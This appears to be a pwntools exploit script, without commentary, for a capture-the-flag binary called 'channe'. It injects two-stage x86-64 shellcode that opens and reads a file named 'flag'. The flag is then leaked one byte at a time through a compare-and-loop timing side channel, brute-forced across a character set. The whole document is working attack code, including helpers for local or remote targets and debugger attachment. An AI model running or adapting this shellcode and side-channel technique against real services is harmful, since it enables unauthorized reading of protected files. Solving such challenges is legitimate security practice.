# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './channe'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    # context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def attack( idx,ch ):

    code = '''
        xor rdi,rdi
        mov rsi,r10
        mov rdx,r11
        xor rax,rax
        syscall
    '''

    cmpcode = '''
        push 0x67616c66
        mov rdi, rsp
        xor rsi,rsi
        xor rdx,rdx
        push SYS_open
        pop rax
        syscall

        mov rdi,3
        add r10,0x200
        mov rsi,r10
        mov rdx,60
        xor rax,rax
        syscall

        mov cl,byte ptr [rsi+{0}]
        mov dl,{1}
        cmp dl,cl
        jz loop
        mov rax,233
        syscall
        loop:
        jmp loop
    '''.format(idx,ch)

    # dbg('*$rebase(0xD12)')
    ru( 'master?' )
    se( asm(code) )
    # raw_input()
    se( asm('nop')*0x20 + asm(cmpcode) +asm('nop')*0x20 )
    # dbg()
    sl('echo shell')
    # ru('shell')
    # p.interactive()

flag = ""

# attack(0,0x66)

allString = '{qwertyuiopasdfghjklzxcvbnm}-_'

for idx in range(0,0x40):
    p = process(binary)
    sleep(1)
    for ch in allString:
        p = process(binary)
        try:
            attack(idx,ord(ch))
            sl('niyah')
            sleep(1)
            sl('\n')
            flag += ch
            p.close()
            print(flag)
            break
        except:
            p.close()
            pass

print(flag)

'''
@File    :   channe.py
@Time    :   2021/10/19 14:06:09
@Author  :   Niyah 
'''